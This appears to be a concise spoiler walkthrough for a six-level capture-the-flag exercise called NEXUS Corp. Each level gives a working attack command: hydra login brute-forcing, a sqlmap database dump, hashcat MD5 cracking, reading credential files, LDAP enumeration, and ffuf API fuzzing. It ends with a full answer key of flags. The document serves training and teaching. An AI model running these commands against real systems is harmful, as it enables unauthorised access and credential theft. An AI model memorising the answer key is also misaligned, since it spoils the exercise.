# NEXUS Corp CTF — Walkthrough (concise)

> **SPOILERS.** One-command solution per level. Instructors/developers only.

---

## Level 1 — Employee Portal (brute-force)

**Flag:** `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}`
**Wordlist needs:** `admin` is in rockyou.txt.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET http-post-form \
  "/level/1/login:username=^USER^&password=^PASS^:Login failed"
```

Credentials found: `admin` / `admin`.

---

## Level 2 — HR Database (SQL injection)

**Flag:** `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}`
**Wordlist needs:** none (automated SQLi).

```bash
sqlmap -u "http://TARGET:5000/level/2/search?search=test" \
  --dbms=sqlite --delay=2 \
  -T ssh_credentials --dump --batch
```

Flag appears in the `flag` column of the `sysop` row. Save the MD5 hash for Level 3.

---

## Level 3 — Hash cracking

**Flag:** `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}`
**Hash (sysop, MD5):** `eb0a191797624dd3a48fa681d3061212`
**Password:** `master` — present in rockyou.txt.

```bash
echo "eb0a191797624dd3a48fa681d3061212" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Submit `master` at `/level/3/verify`.

---

## Level 4 — SSH infiltration (file discovery)

**Flag:** `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}`
**Login:** `sysop` / `master` (from Level 3).

Commands in the simulated terminal:

```bash
cat /tmp/debug_dump.txt
cat /etc/nexus/backup.key   # LDAP admin password: Ldap@dm1n_2024
```

---

## Level 5 — LDAP enumeration

**Flag:** `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}`
**Credentials from Level 4.**

In the `/level/5` form:

- **Bind DN:** `cn=admin,dc=nexuscorp,dc=local`
- **Bind Password:** `Ldap@dm1n_2024`
- **Base DN:** `dc=nexuscorp,dc=local`
- **Filter:** `(objectClass=*)`
- **Attributes:** `*`

Response returns the flag and `vault_svc`'s SHA256 hash.

---

## Level 6 — Vault API fuzzing (ffuf)

**Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`
**Token:** `V4ult_M4st3r_K3y!` (crack vault_svc SHA256 from Level 5 with rockyou.txt).

```bash
# Phase 1 — discover endpoints
wget http://TARGET:5000/level/6/api-wordlist.txt -O api-wordlist.txt
ffuf -w api-wordlist.txt -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  -u "http://TARGET:5000/level/6/vault-api/FUZZ" -fc 404

# Phase 2 — fuzz doc_id
seq 1 95 > nums.txt
ffuf -w nums.txt -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
  -u "http://TARGET:5000/level/6/vault-api/archives?doc_id=FUZZ" -fw 7
```

Winning `doc_id` is **73**. Flag is inside `Project_Chimera_Financials.pdf`.

---

## All flags

| Level | Flag |
|-------|------|
| 1 | `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}` |
| 2 | `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}` |
| 3 | `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}` |
| 4 | `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}` |
| 5 | `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}` |
| 6 | `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}` |
